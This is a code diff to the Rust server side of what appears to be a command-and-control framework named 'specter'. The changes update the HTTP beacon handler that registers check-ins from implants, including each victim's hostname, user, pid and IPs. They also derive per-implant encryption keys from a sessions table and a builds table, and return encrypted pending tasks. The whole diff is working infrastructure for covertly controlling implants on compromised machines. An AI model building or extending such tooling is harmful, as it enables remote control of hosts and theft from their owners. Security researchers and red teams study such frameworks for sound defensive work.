@@ -14,7 +14,10 @@ use axum::{Json, Router};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 use chrono::Utc;
-use specter_common::checkin::{CheckinRequest, CheckinResponse, PendingTaskPayload};
+use specter_common::checkin::{
+    parse_binary_checkin, serialize_binary_response, CheckinRequest, CheckinResponse,
+    PendingTaskPayload,
+};
 use specter_common::proto::specter::v1::{Listener, ListenerStatus};
 use sqlx::sqlite::SqliteRow;
 use sqlx::{Row, SqlitePool};
@@ -41,6 +44,7 @@ pub struct HttpState {
     pub server_pubkey: Arc<PublicKey>,
     pub listener_profile: Option<Arc<ListenerProfile>>,
     pub profile_session_key: Option<Arc<[u8; 32]>>,
+    pub pool: SqlitePool,
 }
 
 /// Build the HTTP router for check-in endpoints. Exposed for testing.
@@ -422,7 +426,7 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
     // Reconstruct the full implant public key by looking up session by prefix.
     // For the first check-in, we accept the full 32-byte key from the ciphertext header
     // and register a new session.
-    let (session_key, session_id) = match derive_session_key(&state, implant_id_prefix).await {
+    let (session_key, session_id, implant_pubkey) = match derive_session_key(&state, implant_id_prefix).await {
         Ok(result) => result,
         Err(_) => return StatusCode::UNAUTHORIZED.into_response(),
     };
@@ -443,10 +447,17 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         Err(_) => return StatusCode::UNAUTHORIZED.into_response(),
     };
 
-    // Parse the decrypted JSON checkin request
-    let checkin_req: CheckinRequest = match serde_json::from_slice(&plaintext) {
-        Ok(r) => r,
-        Err(_) => return StatusCode::BAD_REQUEST.into_response(),
+    // Try binary TLV first (implant sends TLV), fall back to JSON (mock implant, profile path)
+    let (checkin_req, is_binary) = if let Some(req) = parse_binary_checkin(&plaintext) {
+        (req, true)
+    } else if let Ok(req) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
+        (req, false)
+    } else {
+        tracing::warn!(
+            "beacon: failed to parse checkin payload ({} bytes)",
+            plaintext.len()
+        );
+        return StatusCode::BAD_REQUEST.into_response();
     };
 
     // Process check-in (register/update session, handle task results, get pending tasks)
@@ -458,10 +469,10 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
             id.clone()
         }
         None => {
-            // New session — register with pubkey prefix (registration uses full key from body)
+            // New session from builds table — register with full pubkey
             match state
                 .session_manager
-                .register_or_update(
+                .register_or_update_with_pubkey(
                     &checkin_req.hostname,
                     &checkin_req.username,
                     checkin_req.pid,
@@ -470,6 +481,7 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
                     &checkin_req.process_name,
                     &checkin_req.internal_ip,
                     &checkin_req.external_ip,
+                    &implant_pubkey,
                 )
                 .await
             {
@@ -516,17 +528,21 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         tasks: tasks_payload,
     };
 
-    // Encrypt response
-    let resp_json = match serde_json::to_vec(&resp) {
-        Ok(j) => j,
-        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
+    // Serialize response: binary TLV if request was binary, JSON otherwise
+    let response_payload = if is_binary {
+        serialize_binary_response(&resp)
+    } else {
+        match serde_json::to_vec(&resp) {
+            Ok(j) => j,
+            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
+        }
     };
 
     // Generate a fresh nonce for the response
     let resp_nonce_bytes: [u8; 12] = rand::random();
     let resp_nonce = Nonce::from_slice(&resp_nonce_bytes);
 
-    let encrypted = match cipher.encrypt(resp_nonce, resp_json.as_slice()) {
+    let encrypted = match cipher.encrypt(resp_nonce, response_payload.as_slice()) {
         Ok(ct) => ct,
         Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
     };
@@ -557,14 +573,16 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
 
 /// Derive the session key via X25519 + HKDF-SHA256.
 ///
-/// Looks up the implant's full public key in the sessions table by its 12-byte
-/// prefix. If not found, returns Err (the caller should treat this as a new
-/// registration and store the full key after the first successful decryption).
+/// Two-phase lookup:
+///   1. Check existing sessions (returning implants) by pubkey prefix.
+///   2. Check builds table (new implants that haven't registered a session yet).
+///
+/// Returns (session_key, optional_session_id, full_implant_pubkey).
 async fn derive_session_key(
     state: &HttpState,
     implant_id_prefix: &[u8],
-) -> Result<([u8; 32], Option<String>), ()> {
-    // Try to find a session with a matching pubkey prefix
+) -> Result<([u8; 32], Option<String>, [u8; 32]), ()> {
+    // Phase 1: Check existing sessions (returning implants)
     let sessions = state
         .session_manager
         .list_sessions()
@@ -572,46 +590,65 @@ async fn derive_session_key(
         .map_err(|_| ())?;
 
     for session in &sessions {
-        if let Ok(Some(pubkey_bytes)) = state.session_manager.get_implant_pubkey(&session.id).await
-        {
-            if pubkey_bytes.len() >= WIRE_IMPLANT_ID_SIZE
-                && &pubkey_bytes[..WIRE_IMPLANT_ID_SIZE] == implant_id_prefix
-            {
-                // Found matching session — derive session key
-                let implant_pub =
-                    PublicKey::from(<[u8; 32]>::try_from(pubkey_bytes.as_slice()).map_err(|_| ())?);
-                let shared_secret = state.server_secret.diffie_hellman(&implant_pub);
-
-                let session_key = hkdf_sha256_derive(shared_secret.as_bytes());
-                return Ok((session_key, Some(session.id.clone())));
+        if let Ok(Some(pubkey)) = state.session_manager.get_implant_pubkey(&session.id).await {
+            if pubkey.len() >= 12 && &pubkey[..12] == implant_id_prefix {
+                let implant_pub = PublicKey::from(
+                    <[u8; 32]>::try_from(&pubkey[..32]).map_err(|_| ())?
+                );
+                let shared = state.server_secret.diffie_hellman(&implant_pub);
+                let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey[..32]);
+                return Ok((key, Some(session.id.clone()), <[u8; 32]>::try_from(&pubkey[..32]).unwrap()));
             }
+        }
+    }
+
+    // Phase 2: Check builds table (new implants)
+    let row: Option<(Vec<u8>,)> = sqlx::query_as(
+        "SELECT implant_pubkey FROM builds WHERE implant_pubkey_prefix = ?1 LIMIT 1"
+    )
+    .bind(implant_id_prefix)
+    .fetch_optional(&state.pool)
+    .await
+    .map_err(|_| ())?;
+
+    if let Some((pubkey,)) = row {
+        if pubkey.len() == 32 {
+            let implant_pub = PublicKey::from(
+                <[u8; 32]>::try_from(&pubkey[..]).map_err(|_| ())?
+            );
+            let shared = state.server_secret.diffie_hellman(&implant_pub);
+            let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey);
+            let mut pk32 = [0u8; 32];
+            pk32.copy_from_slice(&pubkey);
+            return Ok((key, None, pk32));
         }
     }
 
     Err(())
 }
 
-/// HKDF-SHA256 key derivation from shared secret.
-fn hkdf_sha256_derive(shared_secret: &[u8]) -> [u8; 32] {
+/// HKDF-SHA256 key derivation from shared secret (matches implant's spec_hkdf_derive).
+fn hkdf_sha256_derive(shared_secret: &[u8], implant_pubkey: &[u8]) -> [u8; 32] {
     use hmac::{Hmac, Mac};
     use sha2::Sha256;
 
     type HmacSha256 = Hmac<Sha256>;
 
-    // Extract: PRK = HMAC-SHA256(salt="specter-session", IKM=shared_secret)
-    let salt = b"specter-session";
-    let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).expect("HMAC accepts any key size");
+    // Extract: PRK = HMAC-SHA256(key=implant_pubkey, msg=shared_secret)
+    let mut mac = <HmacSha256 as Mac>::new_from_slice(implant_pubkey)
+        .expect("HMAC key length is valid");
     mac.update(shared_secret);
     let prk = mac.finalize().into_bytes();
 
-    // Expand: OKM = HMAC-SHA256(PRK, info="session-key" || 0x01)
-    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC accepts any key size");
-    mac2.update(b"session-key");
+    // Expand: OKM = HMAC-SHA256(key=PRK, msg="specter-session" || 0x01)
+    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk)
+        .expect("HMAC key length is valid");
+    mac2.update(b"specter-session");
     mac2.update(&[0x01]);
     let okm = mac2.finalize().into_bytes();
 
     let mut key = [0u8; 32];
-    key.copy_from_slice(&okm);
+    key.copy_from_slice(&okm[..32]);
     key
 }
 
@@ -706,6 +743,7 @@ impl ListenerManager {
             server_pubkey: Arc::clone(&self.server_pubkey),
             listener_profile: None,
             profile_session_key: None,
+            pool: self.pool.clone(),
         };
 
         let app = build_router(http_state);
